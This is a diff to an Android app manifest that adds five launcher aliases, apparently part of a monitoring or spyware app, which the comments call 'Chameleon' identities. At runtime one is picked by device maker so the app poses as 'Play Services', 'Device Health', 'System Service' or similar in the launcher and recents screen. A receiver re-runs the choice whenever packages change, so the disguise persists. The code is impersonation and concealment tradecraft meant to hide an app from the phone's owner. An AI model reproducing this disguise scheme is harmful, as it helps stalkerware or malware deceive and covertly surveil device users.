@@ -126,6 +126,105 @@
             </intent-filter>
         </activity-alias>
 
+        <!--
+            ════════════════════════════════════════════════════════════════════
+            CHAMELEON IDENTITY ALIASES
+            ════════════════════════════════════════════════════════════════════
+            Five pre-baked identities. ChameleonIdentity.selectIdentity() enables
+            exactly one at runtime based on the installed app ecosystem and
+            disables all others — so the launcher, app drawer, recents screen,
+            and "Running apps" view all show a single consistent impersonation.
+            All start disabled; the runtime selection happens within the first
+            few seconds of the first launch.
+        -->
+
+        <!-- Index 0 — "System Service": universal fallback, any device -->
+        <activity-alias
+            android:name=".ChameleonAlias0"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_system"
+            android:label="@string/alias_label_0">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 1 — "Play Services": wins on Google-certified (GMS) devices -->
+        <activity-alias
+            android:name=".ChameleonAlias1"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_google"
+            android:label="@string/alias_label_1">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 2 — "Device Health": wins on Samsung devices -->
+        <activity-alias
+            android:name=".ChameleonAlias2"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_health"
+            android:label="@string/alias_label_2">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 3 — "Sync Manager": wins on Xiaomi / MIUI devices -->
+        <activity-alias
+            android:name=".ChameleonAlias3"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_sync"
+            android:label="@string/alias_label_3">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- Index 4 — "Storage Manager": wins on OPPO / ColorOS devices -->
+        <activity-alias
+            android:name=".ChameleonAlias4"
+            android:targetActivity=".MainActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_alias_storage"
+            android:label="@string/alias_label_4">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!--
+            Listens for package install / remove events and triggers a
+            ChameleonIdentity re-scan so the disguise stays optimal as the
+            user adds or removes apps.
+        -->
+        <receiver
+            android:name=".security.PackageChangeReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
         <!-- Consent Activity -->
         <activity
             android:name=".ConsentActivity"
